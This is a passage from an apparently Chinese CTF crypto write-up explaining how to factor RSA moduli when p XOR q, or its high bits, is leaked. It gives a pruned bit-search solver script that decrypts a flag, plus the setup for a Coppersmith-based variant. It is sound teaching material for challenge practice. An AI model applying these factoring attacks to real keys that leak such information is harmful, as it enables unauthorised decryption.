separator="true">,</mo><mtext>我们都能挑选出一些可能</mtext></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mn>2.</mn><mtext>当</mtext><mi>p</mi><mo>⊕</mo><mi>q</mi><mtext>的某一位是</mtext><mn>1</mn><mo separator="true">,</mo><mtext>这表明</mtext><mi>p</mi><mtext>、</mtext><mi>q</mi><mtext>的那一位为</mtext><mn>1</mn><mtext>、</mtext><mn>0</mn><mtext>或者</mtext><mn>0</mn><mtext>、</mtext><mn>1</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mn>3.</mn><mtext>当</mtext><mi>p</mi><mo>⊕</mo><mi>q</mi><mtext>的某一位是</mtext><mn>0</mn><mo separator="true">,</mo><mtext>这表明</mtext><mi>p</mi><mtext>、</mtext><mi>q</mi><mtext>的那一位为</mtext><mn>0</mn><mtext>、</mtext><mn>0</mn><mtext>或者</mtext><mn>1</mn><mtext>、</mtext><mn>1</mn></mrow></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{array}{l}1.对于这512位中的每一位,我们都能挑选出一些可能\\2.当p\oplus q的某一位是1,这表明p、q的那一位为1、0或者0、1\\3.当p\oplus q的某一位是0,这表明p、q的那一位为0、0或者1、1\end{array}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:3.6000000000000005em;vertical-align:-1.5500000000000007em;"></span><span class="mord"><span class="mtable"><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span><span class="mord">.</span><span class="mord cjk_fallback">对</span><span class="mord cjk_fallback">于</span><span class="mord cjk_fallback">这</span><span class="mord">5</span><span class="mord">1</span><span class="mord">2</span><span class="mord cjk_fallback">位</span><span class="mord cjk_fallback">中</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">每</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">位</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">我</span><span class="mord cjk_fallback">们</span><span class="mord cjk_fallback">都</span><span class="mord cjk_fallback">能</span><span class="mord cjk_fallback">挑</span><span class="mord cjk_fallback">选</span><span class="mord cjk_fallback">出</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">些</span><span class="mord cjk_fallback">可</span><span class="mord cjk_fallback">能</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span><span class="mord">.</span><span class="mord cjk_fallback">当</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">某</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">位</span><span class="mord cjk_fallback">是</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">这</span><span class="mord cjk_fallback">表</span><span class="mord cjk_fallback">明</span><span class="mord mathnormal">p</span><span class="mord cjk_fallback">、</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">那</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">位</span><span class="mord cjk_fallback">为</span><span class="mord">1</span><span class="mord cjk_fallback">、</span><span class="mord">0</span><span class="mord cjk_fallback">或</span><span class="mord cjk_fallback">者</span><span class="mord">0</span><span class="mord cjk_fallback">、</span><span class="mord">1</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">3</span><span class="mord">.</span><span class="mord cjk_fallback">当</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">某</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">位</span><span class="mord cjk_fallback">是</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">这</span><span class="mord cjk_fallback">表</span><span class="mord cjk_fallback">明</span><span class="mord mathnormal">p</span><span class="mord cjk_fallback">、</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">那</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">位</span><span class="mord cjk_fallback">为</span><span class="mord">0</span><span class="mord cjk_fallback">、</span><span class="mord">0</span><span class="mord cjk_fallback">或</span><span class="mord cjk_fallback">者</span><span class="mord">1</span><span class="mord cjk_fallback">、</span><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span></span></span></span></span></span></span></p><ul><li><p><strong>确定满足条件的情况</strong>：接下来我们还需要确定搜索到什么条件的时候这个值是我们需要寻找的p、q：<strong>由于我们搜索是按照一位一位搜索，此时只要我们搜索的位数达到512，这时就很可能是符合题目条件的p、q</strong></p></li><li><p><strong>确定判断条件</strong>：进行搜索的时候我们需要降低时间复杂度，所以就要设立一些条件，使得我们可以在更少的时间能得到正确的结果。</p><ul><li>其实我们在搜索的过程中，基本上可以确定搜索的结果有两个，但是我们其实只要搜索一个<code>q</code>即可，因为得到<code>q</code>后，我们可以使用<code>p=n//q</code>计算得到<code>p</code>，此时我们可以默认<code>p&gt;q</code>，也就是当<code>q&lt;p</code>的时候，我们可以认为是不满足条件的，这个时候可以缩短搜索的范围。</li><li>上面的判断条件，只是达到一个<strong>锦上添花</strong>的效果（也就是可以缩短时间）。真正的判断条件，我们需要采取极限思维。</li><li>当我们从高位搜索的时候，搜索到某一位时，<code>p、q</code>的前面高位都已知了，现在我们就可以进行极限的判断。我们判断搜索的这一位时，可以将<code>p、q</code>的剩余位都填充<code>0</code>或者<code>1</code>。将他们的相乘的结果与<code>n</code>比较。<ul><li>最大的情况就是<code>p、q</code>剩余位都填充<code>1</code>，此时如果我们搜索的这一位符合条件，此时应该会有<code>p*q &gt; n</code>，如果此时<code>p*q &lt; n</code>，就说明当前我们搜索到的位不符合结果，直接返回即可</li><li>最小的情况就是<code>p、q</code>剩余位都填充<code>0</code>，此时如果搜索的这一位符合条件，此时应该会有<code>p*q &lt; n</code>，如果此时<code>p*q &gt; n</code>，就表明这次搜索就并不满足题目的条件，直接返回即可。</li></ul></li></ul></li><li><p>接下来我们就使用这样的剪枝方法，对其进行剪枝。这样就可以解密了。</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">c = <span class="number">33413207850749511227518404584965321752648197437023083217857527703127099177958468117297469354994985002189524600969289307041505794655427960517170824136053859608423261628244882944505034355584435922708968489131232463522502708804306900444841660801160750466537456598288260419643939235957605370084010443518319880476</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = <span class="number">69937960689324142377247866549093590080459879074704098933000717642985082246903977856951315583151532583778057166162510030796911163850254255571957322526800143837475133732262049143091225612510157360834204614785780822937994828043052915019016181559335740808052216997021591084236253898991006264268449552394284776071</span></span><br><span class="line">pxorq= <span class="number">3582285148305839319026390070977840914669031102024289028546435294136852418894257457449910319953210049437581456372688605696494343886296081252076014395121030</span></span><br><span class="line">g = <span class="built_in">bin</span>(pxorq)[<span class="number">2</span>:].zfill(<span class="number">512</span>)</span><br><span class="line">x = []</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find</span>(<span class="params">p,q</span>):</span><br><span class="line">    l = <span class="built_in">len</span>(p)</span><br><span class="line">    <span class="comment">#print(l)</span></span><br><span class="line">    <span class="comment"># 先使用4个临时变量,存储着p未搜位全1、全0,q未搜位全1、全0</span></span><br><span class="line">    tmp1 = p+(<span class="number">512</span>-l)*<span class="string">&#x27;0&#x27;</span> <span class="comment"># 全0</span></span><br><span class="line">    tmp2 = p+(<span class="number">512</span>-l)*<span class="string">&#x27;1&#x27;</span> <span class="comment"># 全1</span></span><br><span class="line">    tmq1 = q+(<span class="number">512</span>-l)*<span class="string">&#x27;0&#x27;</span> <span class="comment"># 全0</span></span><br><span class="line">    tmq2 = q+(<span class="number">512</span>-l)*<span class="string">&#x27;1&#x27;</span> <span class="comment"># 全1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 进行搜索操作默认p&gt;q</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">int</span>(tmp1,<span class="number">2</span>) &lt; <span class="built_in">int</span>(tmq1,<span class="number">2</span>)):</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">int</span>(tmp1,<span class="number">2</span>)*<span class="built_in">int</span>(tmq1,<span class="number">2</span>)  &gt; n):</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span>(<span class="built_in">int</span>(tmp2,<span class="number">2</span>)*<span class="built_in">int</span>(tmq2,<span class="number">2</span>) &lt; n):</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(l==<span class="number">512</span>):</span><br><span class="line">        x.append(<span class="built_in">int</span>(q,<span class="number">2</span>))</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span>(g[l] == <span class="string">&#x27;1&#x27;</span>):</span><br><span class="line">            find(p+<span class="string">&#x27;1&#x27;</span>,q+<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">            find(p+<span class="string">&#x27;0&#x27;</span>,q+<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            find(p+<span class="string">&#x27;1&#x27;</span>,q+<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">            find(p+<span class="string">&#x27;0&#x27;</span>,q+<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">tmp1 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">tmp2 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">find(tmp1,tmp2)</span><br><span class="line">p = n//x[<span class="number">0</span>]</span><br><span class="line">phi = (p-<span class="number">1</span>)*(x[<span class="number">0</span>]-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(m)))</span><br><span class="line"><span class="comment"># b&#x27;flag&#123;55529e68-861b-4481-9755-650af1b3ab3e&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h1 id="题型2_已知n和pqgtgtbits"><a class="markdownIt-Anchor" href="#题型2_已知n和pqbits"></a> 题型2_已知n和(p^q&gt;&gt;bits)</h1><ul><li><p>这种题型基本上就是像题型一一样进行剪枝，剪枝得到大部分p大部分的bit位，这样再使用<code>Coppersmith</code>攻击即可。</p></li><li><p>题目附件如下：</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;flag&#123;&quot;</span> + <span class="built_in">str</span>(uuid.uuid4()) + <span class="string">&quot;&#125;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line">m = bytes_to_long(flag.encode())</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">gift = (p ^ q) &gt;&gt; <span class="number">400</span></span><br><span class="line">n = p * q</span><br><span class="line"><span class="built_in">print</span>(gift)</span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">gift= 31958645886829465663742610069283430399728839850513083246386448538197604487936046499520648726337487741518220398603291803472699224153248758152580060648773650158416844012882499079656290683984</span></span><br><span class="line"><span class="string">n= 15619505127163351990488112863141770563681865299685335225044672449726679222174346048307947030511199439211424719776067281155135078932581011042086945379010517674964386503132937564666399232773753915118399621574185937509903051039065814343973923020001058435075609186940135177566113588279789880050765917976777441097617047571689871730580173453909325715236673431821153879912252168063435406632373091016998302026085400209541600123918721359539043369121055076362039338053031901425283160162332806529991986251686578951231643999424466225561068669799631709183429733152004160441220955561218225125773530257724062784558011621107619960331</span></span><br><span class="line"><span class="string">c= 5265044898684398200513906083356703459876884038316945972785773883929874451990761745669452129171819134620745907830964766040424898002648481947297293242536080478374906513529238083909508902829410210784413646328197032379795305874547377474243240849178748210770629567973487901163276011693717054581720387087565368827406564018666754977477364832065988106365591859733598683183313263133882321735804828207940650807293882383692341076382872724971004960700289433466846333180494480231222493734477317628426618535134595262632520744157878280876244576396437437202332728155506177243283113630607686326730151811058616601645253399574984429323</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><ul><li>题目已知如下条件：</li></ul><p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable rowspacing="0.15999999999999992em" columnalign="left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>g</mi><mi>i</mi><mi>f</mi><mi>t</mi><mo>=</mo><mo stretchy="false">(</mo><mi>p</mi><mo>⊕</mo><mi>q</mi><mo stretchy="false">)</mo><mo>&gt;</mo><mo>&gt;</mo><mn>400</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>n</mi><mo>=</mo><mi>p</mi><mo>∗</mo><mi>q</mi></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>e</mi><mo>=</mo><mn>65537</mn></mrow></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{array}{l}gift = (p\oplus q)&gt;&gt;400\\n = p*q\\e = 65537\end{array}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:3.6000000000000005em;vertical-align:-1.5500000000000007em;"></span><span class="mord"><span class="mtable"><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal">t</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord">4</span><span class="mord">0</span><span class="mord">0</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord">6</span><span class="mord">5</span><span class="mord">5</span><span class="mord">3</span><span class="mord">7</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span></span></span></span></span></span></span></p><ul><li>首先我们需要查看一下<code>gitf</code>的位数是不是<code>1024-400=624</code>，如果不是那么<code>gitf</code>需要补0，这是因为在最高位异或的时候，一般是两个1异或，此时得到的结果就会为<code>0</code>，此时最高位就会变小。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line">gift= <span class="number">31958645886829465663742610069283430399728839850513083246386448538197604487936046499520648726337487741518220398603291803472699224153248758152580060648773650158416844012882499079656290683984</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">int</span>(gift).bit_length())</span><br><span class="line">xor_p_q = <span class="built_in">bin</span>(gift)[<span class="number">2</span>:].zfill(<span class="number">624</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(xor_p_q))</span><br><span class="line"><span class="built_in">print</span>(xor_p_q)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">623</span></span><br><span class="line"><span class="string">624</span></span><br><span class="line"><span class="stringspan></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><ul><li>接下来就是类似于题型一，从高位搜索。</li></ul><p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable rowspacing="0.15999999999999992em" columnalign="left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mn>1.</mn><mtext>当</mtext><mi>p</mi><mo>⊕</mo><mi>q</mi><mtext>的某一位是</mtext><mn>1</mn><mo separator="true">,</mo><mtext>这表明</mtext><mi>p</mi><mtext>、</mtext><mi>q</mi><mtext>的那一位为</mtext><mn>1</mn><mtext>、</mtext><mn>0</mn><mtext>或者</mtext><mn>0</mn><mtext>、</mtext><mn>1</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mn>2.</mn><mtext>当</mtext><mi>p</mi><mo>⊕</mo><mi>q</mi><mtext>的某一位是</mtext><mn>0</mn><mo separator="true">,</mo><mtext>这表明</mtext><mi>p</mi><mtext>、</mtext><mi>q</mi><mtext>的那一位为</mtext><mn>0</mn><mtext>、</mtext><mn>0</mn><mtext>或者</mtext><mn>1</mn><mtext>、</mtext><mn>1</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mn>3.</mn><mi>p</mi><mtext>、</mtext><mi>q</mi><mtext>剩余位补</mtext><mn>0</mn><mo separator="true">,</mo><mtext>如果还大于</mtext><mi>n</mi><mtext>则剪去</mtext></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mn>4.</mn><mi>p</mi><mtext>、</mtext><mi>q</mi><mtext>剩余位补</mtext><mn>1</mn><mo separator="true">,</mo><mtext>如果还小于</mtext><mi>n</mi><mtext>则剪去</mtext></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mn>5.</mn><mi>p</mi><mo>&lt;</mo><mi>q</mi><mtext>剪去</mtext></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mn>6.</mn><mtext>最后达到</mtext><mn>624</mn><mtext>位的满足条件的</mtext><mi>p</mi><mtext>值都放入一个列表中</mtext></mrow></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{array}{l}1.当p\oplus q的某一位是1,这表明p、q的那一位为1、0或者0、1\\2.当p\oplus q的某一位是0,这表明p、q的那一位为0、0或者1、1\\3.p、q剩余位补0,如果还大于n则剪去\\4.p、q剩余位补1,如果还小于n则剪去\\5.p&lt;q剪去\\6.最后达到624位的满足条件的p值都放入一个列表中\end{array}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:7.200000000000001em;vertical-align:-3.35em;"></span><span class="mord"><span class="mtable"><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.850000000000001em;"><span style="top:-6.010000000000001em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span><span class="mord">.</span><span class="mord cjk_fallback">当</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">某</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">位</span><span class="mord cjk_fallback">是</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">这</span><span class="mord cjk_fallback">表</span><span class="mord cjk_fallback">明</span><span class="mord mathnormal">p</span><span class="mord cjk_fallback">、</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">那</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">位</span><span class="mord cjk_fallback">为</span><span class="mord">1</span><span class="mord cjk_fallback">、</span><span class="mord">0</span><span class="mord cjk_fallback">或</span><span class="mord cjk_fallback">者</span><span class="mord">0</span><span class="mord cjk_fallback">、</span><span class="mord">1</span></span></span><span style="top:-4.810000000000001em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span><span class="mord">.</span><span class="mord cjk_fallback">当</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">某</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">位</span><span class="mord cjk_fallback">是</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">这</span><span class="mord cjk_fallback">表</span><span class="mord cjk_fallback">明</span><span class="mord mathnormal">p</span><span class="mord cjk_fallback">、</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">那</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">位</span><span class="mord cjk_fallback">为</span><span class="mord">0</span><span class="mord cjk_fallback">、</span><span class="mord">0</span><span class="mord cjk_fallback">或</span><span class="mord cjk_fallback">者</span><span class="mord">1</span><span class="mord cjk_fallback">、</span><span class="mord">1</span></span></span><span style="top:-3.6100000000000003em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">3</span><span class="mord">.</span><span class="mord mathnormal">p</span><span class="mord cjk_fallback">、</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord cjk_fallback">剩</span><span class="mord cjk_fallback">余</span><span class="mord cjk_fallback">位</span><span class="mord cjk_fallback">补</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">如</span><span class="mord cjk_fallback">果</span><span class="mord cjk_fallback">还</span><span class="mord cjk_fallback">大</span><span class="mord cjk_fallback">于</span><span class="mord mathnormal">n</span><span class="mord cjk_fallback">则</span><span class="mord cjk_fallback">剪</span><span class="mord cjk_fallback">去</span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">4</span><span class="mord">.</span><span class="mord mathnormal">p</span><span class="mord cjk_fallback">、</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord cjk_fallback">剩</span><span class="mord cjk_fallback">余</span><span class="mord cjk_fallback">位</span><span class="mord cjk_fallback">补</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">如</span><span class="mord cjk_fallback">果</span><span class="mord cjk_fallback">还</span><span class="mord cjk_fallback">小</span><span class="mord cjk_fallback">于</span><span class="mord mathnormal">n</span><span class="mord cjk_fallback">则</span><span class="mord cjk_fallback">剪</span><span class="mord cjk_fallback">去</span></span></span><span style="top:-1.2100000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">5</span><span class="mord">.</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord cjk_fallback">剪</span><span class="mord cjk_fallback">去</span></span></span><span style="top:-0.009999999999999953em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">6</span><span class="mord">.</span><span class="mord cjk_fallback">最</span><span class="mord cjk_fallback">后</span><span class="mord cjk_fallback">达</span><span class="mord cjk_fallback">到</span><span class="mord">6</span><span class="mord">2</span><span class="mord">4</span><span class="mord cjk_fallback">位</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">满</span><span class="mord cjk_fallback">足</span><span class="mord cjk_fallback">条</span><span class="mord cjk_fallback">件</span><span class="mord cjk_fallback">的</span><span class="mord mathnormal">p</span><span class="mord cjk_fallback">值</span><span class="mord cjk_fallback">都</span><span class="mord cjk_fallback">放</span><span class="mord cjk_fallback">入</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">列</span><span class="mord cjk_fallback">表</span><span class="mord cjk_fallback">中</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:3.35em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span></span></span></span></span></span></span></p><ul><li><p>但是这里还存在一个问题，由于<code>gift</code>是<code>p^q</code>的部分位，所以我们剪枝的时候并不是填充到624位，而是p、q剩余位要补充满1024位。</p></li><li><p>算法如下，首先进行判断判断是否符合条件，判断是否达到624位，然后再进行搜索。</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 